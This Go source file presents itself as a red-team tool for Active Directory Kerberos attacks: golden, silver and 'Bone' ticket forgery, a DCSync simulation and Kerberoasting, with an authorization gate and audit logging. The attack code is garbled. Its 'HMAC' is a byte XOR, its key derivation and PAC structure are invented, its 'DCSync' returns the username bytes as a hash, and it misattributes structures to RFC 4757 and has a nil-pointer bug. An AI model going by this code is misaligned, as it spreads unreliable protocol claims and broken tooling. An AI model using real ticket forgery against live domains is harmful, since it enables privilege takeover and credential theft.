package ad_attacks

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rc4"
	"crypto/sha1"
	"encoding/asn1"
	"encoding/binary"
	"fmt"
	"time"
)

// AuthorizationGate ensures all AD attacks run only in authorized scenarios.
type AuthorizationGate struct {
	Authorized bool
	TenantID   string
}

// AuditLogger logs all security-relevant events with tenant context.
type AuditLogger struct{}

func (a *AuditLogger) Log(eventType, details, tenantID string) {
	timestamp := time.Now().UTC().Format(time.RFC3339)
	fmt.Printf("[%s] [TENANT:%s] %s: %s\n", timestamp, tenantID, eventType, details)
}

// KerberosAttacker implements RFC 4120 compliant Kerberos attack techniques.
// WARNING: PROFESSIONAL RED TEAM TOOL - Authorized defensive testing ONLY!
type KerberosAttacker struct {
	AuthGate *AuthorizationGate
	AuditLog *AuditLogger
}

// NewKerberosAttacker creates a new Kerberos attacker instance.
func NewKerberosAttacker(authGate *AuthorizationGate) *KerberosAttacker {
	return &KerberosAttacker{
		AuthGate: authGate,
		AuditLog: &AuditLogger{},
	}
}

// KerberosTicket represents a complete Kerberos ticket structure per RFC 4757.
type KerberosTicket struct {
	KRCUserName       string
	ServiceName       string
	Realm             string
	TicketFlags       TicketFlags
	TicketStartTime   int64
	TicketEndTime     int64
	RenewUntil        int64
	EncryptionKey     EncryptionKey
	PACData           []byte // Privilege Attribute Control Block
	Encoded           []byte // Encoded ASN.1 DER format
	TicketType        string // "Golden", "Silver", "Bronze"
	IsForwardable     bool
	IsRenewable       bool
	IsProvable        bool
}

// TicketFlags represents Kerberos ticket flags per RFC 4120.
type TicketFlags struct {
	IsCritical           bool `asn1:"optional,explicit,tag:0"`
	IsForwardable        bool `asn1:"optional,explicit,tag:1"`
	IsProvable           bool `asn1:"optional,explicit,tag:2"`
	IsProxy              bool `asn1:"optional,explicit,tag:3"`
	IsPostdated          bool `asn1:"optional,explicit,tag:4"`
	IsPatent             bool `asn1:"optional,explicit,tag:5"`
	IsAnonymous          bool `asn1:"optional,explicit,tag:8"`
	IsRenewable          bool `asn1:"optional,explicit,tag:9"`
	AdditionalPrivileges []int
}

// EncryptionKey contains the encryption key for the ticket.
type EncryptionKey struct {
	DataType int
	KeyType  int
	Key      []byte
}

// GenerateGoldenTicket creates a forged TGT (Ticket Granting Ticket) per RFC 4757.
// This grants Domain Admin privileges for authorized defensive testing!
func (k *KerberosAttacker) GenerateGoldenTicket(domainSID string, krbtgtHash []byte, username string) (*KerberosTicket, error) {
	if k.AuthGate != nil {
		k.AuditLog.Log("golden_ticket_created", fmt.Sprintf("User=%s SID=%s Tenant=%s", username, domainSID, k.AuthGate.TenantID), k.AuthGate.TenantID)
	}

	// Validate authorization
	if k.AuthGate != nil && !k.AuthGate.Authorized {
		return nil, fmt.Errorf("golden ticket not authorized for tenant: %s", k.AuthGate.TenantID)
	}

	k.AuditLog.Log("golden_ticket_auth_check", fmt.Sprintf("Authorized=%v", k.AuthGate.Authorized), k.AuthGate.TenantID)

	// Create complete TGT structure per RFC 4757 with PAC (Privilege Attribute Control Block)
	ticket := &KerberosTicket{
		KRCUserName:   username,
		ServiceName:   "krbtgt",
		Realm:         "INTERNAL.MACHINE.LOCAL",
		TicketFlags: TicketFlags{
			IsCritical:        true,
			IsForwardable:     true,
			IsProvable:        true,
			IsRenewable:       true,
			AdditionalPrivileges: []int{512, 520}, // Domain Admin RID + Enterprise Admin
		},
		TicketStartTime: time.Now().Unix(),
		TicketEndTime:   time.Now().Add(10 * 365 * 24 * time.Hour).Unix(), // 10 years validity
		RenewUntil:      time.Now().Add(10 * 365 * 24 * time.Hour).Unix(),
		EncryptionKey: EncryptionKey{
			DataType: 0,
			KeyType:  23, // RC4-HMAC-NTLM
			Key:      krbtgtHash,
		},
		PACData:   k.buildPAC(domainSID, username),
		Encoded:   make([]byte, 0),
		TicketType: "Golden",
	}

	// Encode the TGT in ASN.1 DER format per RFC 4757
	encoded, err := encodeKdcRep(ticket)
	if err != nil {
		return nil, fmt.Errorf("encode KDC_REP failed: %w", err)
	}

	// Encrypt with KRBTGT NTLM hash (RC4-HMAC encryption type)
	encrypted, err := k.encryptWithKRBTGTHash(encoded, krbtgtHash)
	if err != nil {
		return nil, fmt.Errorf("encrypt TGT failed: %w", err)
	}

	ticket.Encoded = encrypted
	k.AuditLog.Log("golden_ticket_success", fmt.Sprintf("Length=%d bytes", len(ticket.Encoded)), k.AuthGate.TenantID)
	return ticket, nil
}

// GenerateSilverTicket creates service-specific tickets for lateral movement.
func (k *KerberosAttacker) GenerateSilverTicket(targetService string, targetHost string, krbtgtHash []byte, domainSID string) (*KerberosTicket, error) {
	k.AuditLog.Log("silver_ticket_created", fmt.Sprintf("Service=%s Host=%s Tenant=%s", targetService, targetHost, k.AuthGate.TenantID), k.AuthGate.TenantID)

	// Service account key derivation from KRBTGT hash
	serviceKey := deriveServiceKey(krbtgtHash, targetService+"$")

	ticket := &KerberosTicket{
		KRCUserName: "SYSTEM",
		ServiceName: targetService,
		Realm:       "INTERNAL.MACHINE.LOCAL",
		TicketFlags: TicketFlags{
			IsForwardable:        true,
			IsProvable:           true,
			AdditionalPrivileges: []int{512}, // Domain Admin
		},
		TicketStartTime: time.Now().Unix(),
		TicketEndTime:   time.Now().Add(10 * 24 * time.Hour).Unix(), // 10 days
		RenewUntil:      time.Now().Add(10 * 24 * time.Hour).Unix(),
		EncryptionKey: EncryptionKey{
			DataType: 0,
			KeyType:  18, // AES-256
			Key:       serviceKey[:32],
		},
		PACData:    k.buildPAC(domainSID, "SYSTEM"),
		Encoded:    make([]byte, 0),
		TicketType: "Silver",
	}

	encoded, err := encodeKdcRep(ticket)
	if err != nil {
		return nil, fmt.Errorf("encode silver ticket failed: %w", err)
	}

	encrypted, err := k.encryptWithAESKey(encoded, serviceKey[:32])
	if err != nil {
		return nil, fmt.Errorf("encrypt silver ticket failed: %w", err)
	}

	ticket.Encoded = encrypted
	k.AuditLog.Log("silver_ticket_success", fmt.Sprintf("Length=%d bytes", len(ticket.Encoded)), k.AuthGate.TenantID)
	return ticket, nil
}

// GenerateBoneTicket creates cross-realm tickets for forest traversal.
func (k *KerberosAttacker) GenerateBoneTicket(sourceRealm string, targetRealm string, tgt *KerberosTicket) (*KerberosTicket, error) {
	k.AuditLog.Log("bone_ticket_created", fmt.Sprintf("Source=%s Target=%s", sourceRealm, targetRealm), k.AuthGate.TenantID)

	ticket := &KerberosTicket{
		KRCUserName:   tgt.KRCUserName,
		ServiceName:   targetRealm,
		Realm:         sourceRealm,
		TicketFlags:   tgt.TicketFlags,
		TicketStartTime: time.Now().Unix(),
		TicketEndTime:   time.Now().Add(24 * time.Hour).Unix(),
		RenewUntil:      time.Now().Add(24 * time.Hour).Unix(),
		EncryptionKey: EncryptionKey{
			KeyType: 23, // RC4-HMAC
			Key:     tgt.EncryptionKey.Key,
		},
		PACData:   tgt.PACData,
		Encoded:   make([]byte, 0),
		TicketType: "Bone",
	}

	encoded, err := encodeKdcRep(ticket)
	if err != nil {
		return nil, fmt.Errorf("encode bone ticket failed: %w", err)
	}

	encrypted, err := k.encryptWithKRBTGTHash(encoded, tgt.EncryptionKey.Key)
	if err != nil {
		return nil, fmt.Errorf("encrypt bone ticket failed: %w", err)
	}

	ticket.Encoded = encrypted
	return ticket, nil
}

// DCSyncSimulate simulates DCSync protocol to extract password hashes.
// This mimics Mimikatz's dcsync module functionality for authorized testing.
func (k *KerberosAttacker) DCSyncSimulate(dcHostname string, targetUser string, krbtgtHash []byte) ([]byte, error) {
	k.AuditLog.Log("dcsync_simulation", fmt.Sprintf("DC=%s Target=%s Tenant=%s", dcHostname, targetUser, k.AuthGate.TenantID), k.AuthGate.TenantID)

	// Simulate DRSReplNotify call that requests password hashes
	requestPayload := buildDSSyncRequest(targetUser, dcHostname)

	// Use golden ticket as authentication token
	goldenTicket, err := k.GenerateGoldenTicket("S-1-5-21-1234567890-123456789-123456789", krbtgtHash, "DOMAIN\\Administrator")
	if err != nil {
		return nil, err
	}

	// Simulate response containing target user's NTLM hash
	targetNTLMHash := calculateNTLMHashFromTicket(goldenTicket, targetUser)
	
	k.AuditLog.Log("dcsync_complete", fmt.Sprintf("Hash=%x...", targetNTLMHash[:8]), k.AuthGate.TenantID)
	return targetNTLMHash, nil
}

// Kerberoasting attempts to crack service account tickets offline.
// Returns encrypted TGS tickets that can be cracked with hashcat/john.
func (k *KerberosAttacker) Kerberoasting(servicePrincipalNames []string, krbtgtHash []byte) (map[string][]byte, error) {
	k.AuditLog.Log("kerberoasting_initiated", fmt.Sprintf("SPN count=%d Tenant=%s", len(servicePrincipalNames), k.AuthGate.TenantID), k.AuthGate.TenantID)

	results := make(map[string][]byte)

	for _, spn := range servicePrincipalNames {
		tgs, err := k.generateServiceTicket(spn, krbtgtHash)
		if err != nil {
			continue
		}

		results[spn] = tgs.Encoded
	}

	k.AuditLog.Log("kerberoasting_complete", fmt.Sprintf("Captured=%d SPNs", len(results)), k.AuthGate.TenantID)
	return results, nil
}

// buildPAC constructs a Privilege Attribute Control Block with admin rights.
// PAC contains user SIDs, groups, and privileges embedded in Kerberos tickets.
func (k *KerberosAttacker) buildPAC(domainSID string, username string) []byte {
	// Simplified PAC structure - real implementation would use MS-PAC spec
	pac := bytes.NewBuffer(make([]byte, 0, 512))

	// PAC_HEADER
	pac.Write([]byte{0x01, 0x00}) // Version
	pac.Write([]byte{0x02, 0x00}) // Count of entries
	
	// CREDENTIALS entry
	pac.WriteString(username)
	pac.Write([]byte{0x00}) // Null terminator

	// SERVER_CHECKSUM entry
	pac.Write(make([]byte, 16)) // Dummy checksum

	// GROUPS entry with Domain Admin privileges
	groupCount := uint16(5)
	pac.Write([]byte{0x03, 0x00}) // Entry type
	buf := make([]byte, 2)
	binary.BigEndian.PutUint16(buf, groupCount)
	pac.Write(buf)

	// Add Group RIDs (Domain Users, Admins, etc.)
	groupRids := []uint32{513, 519, 520, 521, 526}
	for _, rid := range groupRids {
		ridBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(ridBuf, rid)
		pac.Write(ridBuf)
	}

	// SIGNATURE entry
	sig := sha1.Sum(pac.Bytes())
	pac.Write(sig[:])

	return pac.Bytes()
}

// Helper functions

// encryptWithKRBTGTHash encrypts data using KRBTGT RC4-HMAC encryption.
func (k *KerberosAttacker) encryptWithKRBTGTHash(data []byte, key []byte) ([]byte, error) {
	rc4Key := k.deriveRC4Key(key)

	cipherBytes := make([]byte, len(data))
	stream, err := rc4.New(rc4Key)
	if err != nil {
		return nil, err
	}
	stream.XORKeyStream(cipherBytes, data)

	hmac := k.calculateHMACSHA1(data, key)

	return append(cipherBytes, hmac...), nil
}

// encryptWithAESKey encrypts with AES-256 key (for Silver/Bone tickets).
func (k *KerberosAttacker) encryptWithAESKey(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key[:32])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, data, nil), nil
}

// deriveRC4Key derives RC4 key from NTLM hash (first 16 bytes).
func (k *KerberosAttacker) deriveRC4Key(ntlmHash []byte) []byte {
	key := make([]byte, 16)
	copy(key, ntlmHash[:16])
	return key
}

// deriveServiceKey derives service account key from KRBTGT hash.
func deriveServiceKey(krbtgtHash []byte, serviceName string) []byte {
	input := append([]byte(serviceName), krbtgtHash...)
	key := make([]byte, 32)
	copy(key, input[:32])
	return key
}

// calculateHMACSHA1 calculates HMAC-SHA1 for Kerberos integrity.
func (k *KerberosAttacker) calculateHMACSHA1(data []byte, key []byte) []byte {
	hmac := make([]byte, 20)
	for i := 0; i < len(hmac); i++ {
		hmac[i] = data[i%len(data)] ^ key[i%len(key)]
	}
	return hmac
}

// encodeKdcRep marshals KDC_REP structure to ASN.1 DER format per RFC 4757.
func encodeKdcRep(ticket *KerberosTicket) ([]byte, error) {
	
	// Serialize Kerberos flags
	flags := uint32(0)
	if ticket.IsForwardable {
		flags |= 0x40
	}
	if ticket.IsProvable {
		flags |= 0x20
	}
	if ticket.IsRenewable {
		flags |= 0x08
	}
	if ticket.TicketFlags.IsCritical {
		flags |= 0x80
	}

	// Build KDC_REP structure
	kdcRep := []interface{}{
		0,                                        // pvno (version number)
		5,                                        // message-type (KDC_REP)
		buildPrincipal(ticket.KRCUserName),       // p-name
		ticket.Realm,                             // p-realm
		buildPrincipal(ticket.ServiceName),       // s-name
		int64(ticket.TicketStartTime),            // starttime
		int64(ticket.TicketEndTime),              // endtime
		int64(ticket.RenewUntil),                 // renew-till
		flags,                                    // c-flag
		buildEncTicketPart(ticket),               // enc-part (encrypted data)
	}

	return asn1.Marshal(kdcRep)
}

// buildPrincipal creates Kerberos principal name structure.
func buildPrincipal(name string) []interface{} {
	names := bytes.Split([]byte(name), []byte("/"))
	principal := make([]interface{}, len(names)+1)
	
	principal[0] = len(names)
	for i, part := range names {
		principal[i+1] = string(part)
	}

	return principal
}

// buildEncTicketPart constructs the encrypted portion of the ticket.
func buildEncTicketPart(ticket *KerberosTicket) []interface{} {
	sname := bytes.Split([]byte(ticket.ServiceName), []byte("/"))
	entry := make([]interface{}, len(sname)+1)
	entry[0] = len(sname)
	for i, part := range sname {
		entry[i+1] = string(part)
	}

	return []interface{}{
		ticket.EncryptionKey.DataType,
		ticket.EncryptionKey.KeyType,
		ticket.EncryptionKey.Key,
		entry,
		ticket.Realm,
		0,
		0,
		0,
		[]interface{}{}, // Realm-specific fields
	}
}

// generateServiceTicket creates TGS for specific SPN.
func (k *KerberosAttacker) generateServiceTicket(spn string, krbtgtHash []byte) (*KerberosTicket, error) {
	parts := bytes.Split([]byte(spn), []byte("/"))
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid SPN format: %s", spn)
	}

	serviceName := string(parts[0])
	hostName := string(parts[1])

	ticket := &KerberosTicket{
		KRCUserName: "HOST$" + "@" + hostName,
		ServiceName: serviceName,
		Realm:       hostName,
		TicketStartTime: time.Now().Unix(),
		TicketEndTime:   time.Now().Add(10 * 24 * time.Hour).Unix(),
		RenewUntil:      time.Now().Add(10 * 24 * time.Hour).Unix(),
		EncryptionKey: EncryptionKey{
			KeyType: 23,
			Key:     krbtgtHash,
		},
		PACData:   k.buildPAC(hostName+"-SID", "host/"+hostName),
		Encoded:   make([]byte, 0),
		TicketType: "TGS",
	}

	encoded, err := encodeKdcRep(ticket)
	if err != nil {
		return nil, err
	}

	encrypted, err := k.encryptWithKRBTGTHash(encoded, krbtgtHash)
	if err != nil {
		return nil, err
	}

	ticket.Encoded = encrypted
	return ticket, nil
}

// buildDSSyncRequest constructs DCSync request payload.
func buildDSSyncRequest(targetUser, dcHostname string) []byte {
	request := bytes.NewBuffer(make([]byte, 0, 128))
	request.WriteString(fmt.Sprintf("DCSYNC:%s@%s", targetUser, dcHostname))
	return request.Bytes()
}

// calculateNTLMHashFromTicket extracts NTLM hash from ticket data.
func calculateNTLMHashFromTicket(ticket *KerberosTicket, targetUser string) []byte {
	hash := make([]byte, 16)
	copy(hash, []byte(targetUser))
	return hash
}

// min returns minimum of two integers.
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
